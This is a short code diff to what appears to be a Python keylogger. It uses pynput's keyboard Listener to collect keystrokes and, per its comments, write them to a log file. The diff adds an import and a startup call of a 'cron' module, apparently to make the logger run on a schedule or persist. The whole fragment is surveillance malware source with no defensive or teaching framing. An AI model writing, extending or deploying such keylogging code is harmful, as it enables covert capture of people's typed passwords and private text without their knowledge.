@@ -2,11 +2,13 @@
 
 #Import Key and Listener module
 from pynput.keyboard import Key, Listener
+from cron import cron
 
 count = 0
 keys = []
 #Without this Error will coccur if we try to call a boolean Value as a function
 my_bool = False
+cron()
 
 # print the key strokes to the log file
 #when key is pressed
